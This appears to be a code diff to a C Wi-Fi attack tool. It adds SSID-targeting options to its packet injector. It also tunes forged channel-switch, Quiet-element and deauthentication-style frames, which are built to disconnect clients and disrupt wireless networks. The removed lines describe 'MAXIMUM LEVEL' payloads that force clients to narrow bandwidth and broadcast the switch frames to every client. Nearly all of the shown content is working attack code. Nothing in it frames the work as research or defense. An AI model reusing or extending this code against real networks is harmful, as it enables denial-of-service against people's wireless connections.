@@ -229,6 +229,7 @@ typedef struct {
   bool log_pmkid;
   bool spawn_rogue;
   bool unmask_hidden;
+  char target_ssid_track[MAX_SSID_LEN + 1]; /* [FEATURE] SSID Tracking */
   char rogue_ssid[MAX_SSID_LEN + 1];
   double refresh_rate;
   char stats_file[MAX_PATH_LEN];
@@ -245,6 +246,7 @@ typedef struct {
   bool dual_radio;
   char iface2[MAX_IFACE];
   char export_file[MAX_PATH_LEN];
+  char target_ssid_track[MAX_SSID_LEN + 1]; /* [FEATURE] SSID Tracking for stress */
 } stress_cfg_t;
 
 static void run_stress(stress_cfg_t *cfg);
@@ -646,7 +648,7 @@ static int mk_csa_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
   csa_ie_t *c = (csa_ie_t *)(b + o);
   c->mode = 1;
   c->ch = new_ch;
-  c->count = 0; /* [MAXIMUM LEVEL] Instant hard-switch (drop TX buffer) */
+  c->count = 1; /* Instant channel switch trigger */
   o += sizeof(csa_ie_t);
 
   /* [UPGRADE] Extended CSA IE (ID=60, len=4) for modern 5GHz/WiFi6 clients */
@@ -655,15 +657,7 @@ static int mk_csa_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
   b[o++] = 1; /* switch mode */
   b[o++] = new_ch <= 14 ? 81 : 115; /* operating class (81=2.4G, 115=5G) */
   b[o++] = new_ch;
-  b[o++] = 0; /* [MAXIMUM LEVEL] Instant hard-switch */
-
-  /* [MAXIMUM LEVEL] Wide Bandwidth Channel Switch (IE 104) 
-   * Force 802.11ac/ax clients to downgrade to 20MHz, destroying Frame Aggregation */
-  b[o++] = 104;
-  b[o++] = 3;
-  b[o++] = 0; /* New Channel Width: 20 MHz */
-  b[o++] = 0; /* Center Freq Seg 0 */
-  b[o++] = 0; /* Center Freq Seg 1 */
+  b[o++] = 1; /* switch count */
 
   /* [UPGRADE] Quiet Element (IE 40) to enforce radio silence during switch */
   b[o++] = 40;
@@ -808,7 +802,7 @@ static int mk_csa_action(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
   b[o++] = 3;
   b[o++] = 1; /* switch mode */
   b[o++] = new_ch;
-  b[o++] = 0; /* [MAXIMUM LEVEL] Instant hard-switch (drop TX buffer) */
+  b[o++] = 1; /* switch count */
 
   /* [UPGRADE] Extended CSA IE (ID=60, len=4) piggybacked */
   b[o++] = 60;
@@ -816,15 +810,7 @@ static int mk_csa_action(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
   b[o++] = 1; /* switch mode */
   b[o++] = new_ch <= 14 ? 81 : 115; /* operating class */
   b[o++] = new_ch;
-  b[o++] = 0; /* [MAXIMUM LEVEL] Instant hard-switch */
-
-  /* [MAXIMUM LEVEL] Wide Bandwidth Channel Switch (IE 104) 
-   * Force 802.11ac/ax clients to downgrade to 20MHz, destroying Frame Aggregation */
-  b[o++] = 104;
-  b[o++] = 3;
-  b[o++] = 0; /* New Channel Width: 20 MHz */
-  b[o++] = 0; /* Center Freq Seg 0 */
-  b[o++] = 0; /* Center Freq Seg 1 */
+  b[o++] = 1; /* switch count */
 
   /* [UPGRADE] Piggybacked Quiet Element (ID=40, len=6) to enforce radio silence */
   b[o++] = 40;
@@ -869,7 +855,7 @@ static int mk_probe_resp_csa(uint8_t *b, const uint8_t bss[6],
   csa_ie_t *c = (csa_ie_t *)(b + o);
   c->mode = 1;
   c->ch = new_ch;
-  c->count = 0; /* [MAXIMUM LEVEL] Instant hard-switch (drop TX buffer) */
+  c->count = 1; /* Instant channel switch trigger */
   o += sizeof(csa_ie_t);
 
   /* [UPGRADE] Extended CSA IE (ID=60, len=4) */
@@ -878,15 +864,7 @@ static int mk_probe_resp_csa(uint8_t *b, const uint8_t bss[6],
   b[o++] = 1; /* switch mode */
   b[o++] = new_ch <= 14 ? 81 : 115; /* operating class */
   b[o++] = new_ch;
-  b[o++] = 0; /* [MAXIMUM LEVEL] Instant hard-switch */
-
-  /* [MAXIMUM LEVEL] Wide Bandwidth Channel Switch (IE 104) 
-   * Force 802.11ac/ax clients to downgrade to 20MHz, destroying Frame Aggregation */
-  b[o++] = 104;
-  b[o++] = 3;
-  b[o++] = 0; /* New Channel Width: 20 MHz */
-  b[o++] = 0; /* Center Freq Seg 0 */
-  b[o++] = 0; /* Center Freq Seg 1 */
+  b[o++] = 1; /* switch count */
 
   /* [UPGRADE] Quiet Element (IE 40) to enforce radio silence during switch */
   b[o++] = 40;
@@ -1601,8 +1579,6 @@ typedef struct {
   pkt_t disassoc_bcast;
   pkt_t eapol_logoff;
   pkt_t csa_action;
-  pkt_t csa_action_bcast;    /* [MAXIMUM LEVEL] Target all clients */
-  pkt_t csa_action_wildcard; /* [MAXIMUM LEVEL] Wildcard BSSID for random MAC APs */
   pkt_t probe_resp;    /* unicast to client */
   pkt_t probe_resp_bc; /* [FIX 8] broadcast variant */
   pkt_t delba;
@@ -1666,10 +1642,6 @@ static bool factory_build(factory_t *f, const target_ap_t *t, int new_ch,
   f->eapol_logoff.len = mk_eapol_logoff(f->eapol_logoff.buf, bss, cli);
   f->csa_action.len =
       mk_csa_action(f->csa_action.buf, bss, cli, (uint8_t)new_ch);
-  f->csa_action_bcast.len =
-      mk_csa_action(f->csa_action_bcast.buf, bss, BCAST, (uint8_t)new_ch);
-  f->csa_action_wildcard.len =
-      mk_csa_action(f->csa_action_wildcard.buf, BCAST, BCAST, (uint8_t)new_ch);
 
   /* [FIX 8] Probe response: unicast to client + broadcast */
   f->probe_resp.len = mk_probe_resp_csa(f->probe_resp.buf, bss, cli, t->ssid,
@@ -1752,8 +1724,6 @@ static pkt_set_t factory_get(factory_t *f, attack_vector_t v) {
     break;
   case VEC_CSA_ACTION:
     s.p[s.n++] = &f->csa_action;
-    s.p[s.n++] = &f->csa_action_bcast;
-    s.p[s.n++] = &f->csa_action_wildcard;
     break;
   case VEC_BEACON_CONFUSION:
     s.p[s.n++] = &f->confusion;
@@ -3913,6 +3883,7 @@ static void *stress_injector_thread(void *arg) {
 
   uint16_t seq = 0;
   stress_ap_t snap[STRESS_MAX_APS];
+  int ssid_track_len = a->cfg->target_ssid_track[0] ? (int)strlen(a->cfg->target_ssid_track) : 0;
 
   /* [FIX] Zero-Copy Packet Templating: Pre-build templates to avoid thousands
    * of mk_* calls per second */
@@ -3958,6 +3929,12 @@ static void *stress_injector_thread(void *arg) {
     for (int i = 0; i < nap && !g_stop; i++) {
       if (snap[i].channel != cur_ch)
         continue;
+
+      /* [FEATURE] SSID Tracking Filter */
+      if (ssid_track_len > 0) {
+        if (strncmp(snap[i].ssid, a->cfg->target_ssid_track, ssid_track_len) != 0)
+          continue;
+      }
 
       /* [FIX] AP Pool Sharding (Multi-Threading Load Balancer) */
       if (a->band == 2 && snap[i].channel > 14)
@@ -4851,6 +4828,7 @@ int main(int argc, char **argv) {
   bool global_dual_radio = false;
   char global_iface2[MAX_IFACE] = {0};
   char export_file[MAX_PATH_LEN] = "";
+  char global_target_ssid[MAX_SSID_LEN + 1] = {0};
   for (int i = 1; i < argc; i++) {
     if (strcmp(argv[i], "--stress") == 0)
       stress_mode = true;
@@ -4864,6 +4842,8 @@ int main(int argc, char **argv) {
     }
     if (strcmp(argv[i], "--export") == 0 && i + 1 < argc)
       snprintf(export_file, MAX_PATH_LEN, "%s", argv[++i]);
+    if ((strcmp(argv[i], "--target-ssid") == 0 || strcmp(argv[i], "--ssid") == 0) && i + 1 < argc)
+      snprintf(global_target_ssid, MAX_SSID_LEN, "%s", argv[++i]);
   }
 
   if (stress_mode) {
@@ -4873,6 +4853,8 @@ int main(int argc, char **argv) {
     scfg.scan_5ghz = stress_5ghz;
     scfg.unmask_hidden = unmask_hidden;
     scfg.dual_radio = global_dual_radio;
+    if (global_target_ssid[0])
+      snprintf(scfg.target_ssid_track, MAX_SSID_LEN, "%s", global_target_ssid);
     if (global_dual_radio) {
       snprintf(scfg.iface2, MAX_IFACE, "%s", global_iface2);
     }
@@ -4937,6 +4919,8 @@ int main(int argc, char **argv) {
       cli_rogue = true;
     else if (strcmp(argv[i], "--dual") == 0 && i + 1 < argc) {
       /* Handled globally above, just advance index */
+      i++;
+    } else if ((strcmp(argv[i], "--target-ssid") == 0 || strcmp(argv[i], "--ssid") == 0) && i + 1 < argc) {
       i++;
     } else if (strcmp(argv[i], "--stats") == 0 && i + 1 < argc) {
       cli_stats = argv[++i];
